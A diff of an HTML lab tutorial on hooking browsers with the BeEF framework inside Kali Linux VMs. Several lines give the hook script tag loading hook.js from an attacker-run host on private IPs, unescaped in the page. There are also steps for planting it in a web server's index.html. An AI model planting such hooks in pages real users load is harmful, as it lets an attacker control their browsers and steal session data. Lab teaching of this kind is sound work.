@@ -23,22 +23,30 @@ Paste the url into the browser <br/>
 <b>http://127.0.0.1:3000/ui/panel</b>
 </p>
 
-Open the framework.
+<h4>Open the framework.</h4>
+<p>
 You will see we have Online and Offline directories for websites we have hooked.
 In order to hook a browser to BeEF we have to get the browser to execute a specific JavaScript code.
-
-Web UI: 		http://127.0.0.1:3000/ui/panel
-Hook: 		<script src="http://[IP Address]:3000/hook.js"></script>
-Example: 	<script src="http://127.0.0.1:3000/hook.js"></script>
-MyKali:	 	<script src="http://192.168.1.72:3000/hook.js"></script>
-
-Kali Linux VM only…
+<br/>
+Web UI: 		http://127.0.0.1:3000/ui/panel<br/>
+Hook: 		<script src="http://[IP Address]:3000/hook.js"></script><br/>
+Example: 	<script src="http://127.0.0.1:3000/hook.js"></script><br/>
+MyKali:	 	<script src="http://192.168.1.72:3000/hook.js"></script><br/>
+</p>
+<h4>Kali Linux VM only…</h4>
+<p>
 Open File Manager and go to web root, where the files for our web server are stored.  So, the location where we have our index.html.
-/var/www/html .
+<br/>/var/www/html .<br/>
 
 Either double click and hope for the best, or right click and open with your fave text editor.
 Backup index.html, then delete contents and paste script link with your IP, you can get from ifconfig.
+<br/>
 <script src="http://192.168.1.72:3000/hook.js"></script>
-
-Start the apache web server
+<br/>
+Start the apache web server: <br/>
 $ sudo service apache2 start
+</p>
+<p>
+Go to another virtual machine and browse to your IP.<br/>
+You will see an entry in the BeEF panel framework.
+</p>
